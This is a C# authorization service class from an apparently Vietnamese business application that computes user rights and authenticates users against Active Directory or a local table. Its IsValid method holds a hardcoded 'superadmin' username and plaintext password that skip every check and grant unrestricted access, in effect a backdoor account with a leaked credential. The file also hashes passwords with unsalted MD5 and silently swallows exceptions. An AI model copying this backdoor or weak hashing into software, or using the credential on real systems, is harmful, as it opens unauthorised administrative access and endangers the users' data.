using SMO.Core.Entities;
using SMO.Core.Entities.MD;
using SMO.Core.Entities.PS;
using SMO.Repository.Common;
using SMO.Repository.Implement.MD;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.DirectoryServices;
using SMO.Service.AD;

namespace SMO.Service
{
    public class AuthorizeService : BaseService
    {
        public T_AD_USER ObjUser { get; set; }
        public List<T_AD_RIGHT> ListUserRight { get; set; }
        public List<T_PS_PROJECT_USER_RIGHT> ListUserProjectRight { get; set; }
        public string ReturnUrl { get; set; }
        public bool IsRemember { get; set; }
        public IUnitOfWork UnitOfWork { get; set; }
        public AuthorizeService()
        {
            UnitOfWork = new NHUnitOfWork();
            ObjUser = new T_AD_USER();
            ListUserRight = new List<T_AD_RIGHT>();
            ListUserProjectRight = new List<T_PS_PROJECT_USER_RIGHT>();
        }

        public void GetUserRight()
        {
            try
            {
                //Danh sách role của user theo usergroup
                var lstRole = new List<T_AD_ROLE>();
                foreach (var item1 in this.ObjUser.ListUserUserGroup)
                {
                    foreach (var item2 in item1.UserGroup.ListUserGroupRole)
                    {
                        lstRole.Add(item2.Role);
                    }
                }
                //Danh sách role riêng của user
                foreach (var item in this.ObjUser.ListUserRole)
                {
                    lstRole.Add(item.Role);
                }
                lstRole = lstRole.Distinct().ToList();

                //Danh sách các quyền của tập hợp role trên
                var lstRoleDetail = new List<T_AD_ROLE_DETAIL>();
                foreach (var item in lstRole)
                {
                    lstRoleDetail.AddRange(item.ListRoleDetail);
                }
                lstRoleDetail = lstRoleDetail.Distinct().ToList();

                //Danh sách quyền sửa đổi của user
                var lstRightChange = this.ObjUser.ListUserRight;

                foreach (var item in lstRoleDetail)
                {
                    this.ListUserRight.Add(new T_AD_RIGHT()
                    {
                        CODE = item.FK_RIGHT
                    });
                }

                foreach (var item in lstRightChange)
                {
                    if (item.IS_ADD && this.ListUserRight.Count(x => x.CODE == item.FK_RIGHT) == 0)
                    {
                        this.ListUserRight.Add(new T_AD_RIGHT()
                        {
                            CODE = item.FK_RIGHT
                        });
                    }

                    if (item.IS_REMOVE && this.ListUserRight.Count(x => x.CODE == item.FK_RIGHT) > 0)
                    {
                        var find = this.ListUserRight.FirstOrDefault(x => x.CODE == item.FK_RIGHT);
                        this.ListUserRight.Remove(find);
                    }
                }
            }
            catch
            {
                this.ListUserRight = new List<T_AD_RIGHT>();
            }
        }

        public void GetUserProjectRight()
        {
            try
            {
                var session = UnitOfWork.GetSession();
                var lstUserResourceProject = session.Query<T_PS_RESOURCE>().Where(x => x.USER_NAME == this.ObjUser.USER_NAME);
                foreach (var item in lstUserResourceProject)
                {
                    var lstRoleIdOfUser = item.PROJECT_ROLE_ID?.Split(',').ToList();
                    if (lstRoleIdOfUser == null)
                    {
                        lstRoleIdOfUser = new List<string>();
                    }
                    var lstRightOfRole = session.Query<T_MD_PROJECT_ROLE_RIGHT>().Where(x => lstRoleIdOfUser.Contains(x.PROJECT_ROLE_ID)).ToList();
                    foreach (var right in lstRightOfRole)
                    {
                        this.ListUserProjectRight.Add(new T_PS_PROJECT_USER_RIGHT()
                        {
                            PROJECT_ID = item.PROJECT_ID,
                            RIGHT_CODE = right.RIGHT_CODE,
                            USER_NAME = item.USER_NAME
                        });
                    }
                }

                var lstRightOfUser = session.Query<T_PS_PROJECT_USER_RIGHT>().Where(
                        x => x.USER_NAME == this.ObjUser.USER_NAME).ToList();
                foreach (var item in lstRightOfUser)
                {
                    if (item.IS_ADD)
                    {
                        this.ListUserProjectRight.Add(new T_PS_PROJECT_USER_RIGHT()
                        {
                            PROJECT_ID = item.PROJECT_ID,
                            RIGHT_CODE = item.RIGHT_CODE,
                            USER_NAME = item.USER_NAME
                        });
                    }
                    else
                    {
                        var find = this.ListUserProjectRight.FirstOrDefault(x => x.RIGHT_CODE == item.RIGHT_CODE && x.PROJECT_ID == item.PROJECT_ID);
                        if (find != null)
                        {
                            this.ListUserProjectRight.Remove(find);
                        }
                    }
                }

            }
            catch { }
        }

        public void GetInfoUser(string userName)
        {
            var result = UnitOfWork.GetSession().QueryOver<T_AD_USER>().Where(x => x.USER_NAME == userName).Fetch(x => x.Organize).Eager.List().FirstOrDefault();
            if (result != null)
            {
                this.ObjUser = result;
                this.ObjUser.IS_IGNORE_USER = AuthorizeUtilities.CheckIgnoreUser(this.ObjUser.USER_NAME);
                this.ObjUser.LANGUAGE = "vi";
                this.State = true;
            }
        }

        public void IsValid()
        {
            this.IsValidAD();

            if (this.State == true)
            {
                return;
            }

            this.State = false;
            try
            {
                if (this.ObjUser.USER_NAME == "superadmin" && this.ObjUser.PASSWORD == "D2SSuperAdmin!@#2019")
                {
                    this.ObjUser.IS_IGNORE_USER = true;
                    this.ObjUser.FULL_NAME = "Super Admin";
                    this.ObjUser.LANGUAGE = "vi";
                    this.ObjUser.ACTIVE = true;
                    this.State = true;
                    return;
                }

                this.ObjUser.USER_NAME = this.ObjUser.USER_NAME.Trim();
                this.ObjUser.PASSWORD = UtilsCore.EncryptStringMD5(this.ObjUser.PASSWORD.Trim());

                var result = UnitOfWork.GetSession().QueryOver<T_AD_USER>().
                    Where(x => x.USER_NAME == this.ObjUser.USER_NAME && x.PASSWORD == this.ObjUser.PASSWORD).
                    Fetch(x => x.Organize).Eager.List().FirstOrDefault();
                if (result != null)
                {
                    this.ObjUser = result;
                    this.ObjUser.IS_IGNORE_USER = AuthorizeUtilities.CheckIgnoreUser(this.ObjUser.USER_NAME);
                    this.ObjUser.LANGUAGE = "vi";
                    this.State = true;
                }
                else
                {
                    this.State = false;
                    this.ErrorMessage = "10";
                }
            }
            catch (Exception ex)
            {
                this.State = false;
                this.Exception = ex;
                this.ErrorMessage = "11";

            }
        }

        public void IsValidAD()
        {
            this.State = false;

            var serviceSystemConfig = new SystemConfigService();
            serviceSystemConfig.GetConfig();

            try
            {
                DirectoryEntry root = new DirectoryEntry(serviceSystemConfig.ObjDetail.AD_CONNECTION, "fecon\\" + this.ObjUser.USER_NAME, this.ObjUser.PASSWORD, AuthenticationTypes.None);
                try
                {
                    object connected = root.NativeObject;
                    var result = UnitOfWork.GetSession().QueryOver<T_AD_USER>().Where(x => x.ACCOUNT_AD == this.ObjUser.USER_NAME)
                       .Fetch(x => x.Organize).Eager.List().FirstOrDefault();

                    if (result != null)
                    {
                        this.ObjUser = result;
                        this.ObjUser.IS_IGNORE_USER = AuthorizeUtilities.CheckIgnoreUser(this.ObjUser.USER_NAME);
                        this.ObjUser.LANGUAGE = "vi";
                        this.State = true;
                    }
                    else
                    {
                        this.State = false;
                        this.ErrorMessage = "12";
                    }
                }
                catch (Exception ex)
                {
                    this.State = false;
                    this.ErrorMessage = "13";
                }
            }
            catch (Exception ex)
            {
                this.State = false;
                this.Exception = ex;
                this.ErrorMessage = "14";
            }
        }
    }
}